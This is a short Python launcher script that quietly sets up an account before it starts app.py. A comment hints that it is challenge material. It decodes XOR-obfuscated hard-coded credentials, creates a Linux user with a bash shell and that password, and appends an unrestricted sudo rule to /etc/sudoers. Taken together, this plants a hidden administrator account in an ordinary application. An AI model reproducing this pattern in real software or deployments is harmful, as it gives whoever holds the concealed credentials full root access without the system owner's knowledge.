#!/usr/bin/env python3
import subprocess
import os

# Obfuscated system credentials, I dont want to make it super easy for you guys...
_k = "49ced06182fcef842e713c81b59025d24857d3ee409d6e719932a3de94f77a11"
_d = [0x55, 0x5d, 0x0e, 0x0c, 0x0a, 0x6f, 0x5b, 0x50, 0x4b, 0x46,
      0x03, 0x11, 0x5f, 0x25, 0x6c, 0x72, 0x49, 0x17, 0x04, 0x47,
      0x6c, 0x50, 0x56, 0x56, 0x3d, 0x57, 0x0d, 0x51, 0x51, 0x5e,
      0x00, 0x02, 0x04, 0x4a, 0x6a, 0x03, 0x07, 0x50, 0x56, 0x16,
      0x47, 0x11, 0x44]


def _x():
    return ''.join(chr(_d[i] ^ ord(_k[i % len(_k)])) for i in range(len(_d)))


def setup_system_user():
    creds = _x()
    user, passwd = creds.split(':', 1)

    # Only first run
    result = subprocess.run(['id', user], capture_output=True)
    if result.returncode != 0:
        subprocess.run(['useradd', '-m', '-s', '/bin/bash', user], check=True)
        p = subprocess.Popen(['chpasswd'], stdin=subprocess.PIPE)
        p.communicate(f'{user}:{passwd}'.encode())

        # Grant sudo 
        with open('/etc/sudoers', 'a') as f:
            f.write(f'\n{user} ALL=(ALL) ALL\n')


if __name__ == '__main__':
    setup_system_user()
    os.execvp('python', ['python', 'app.py'])
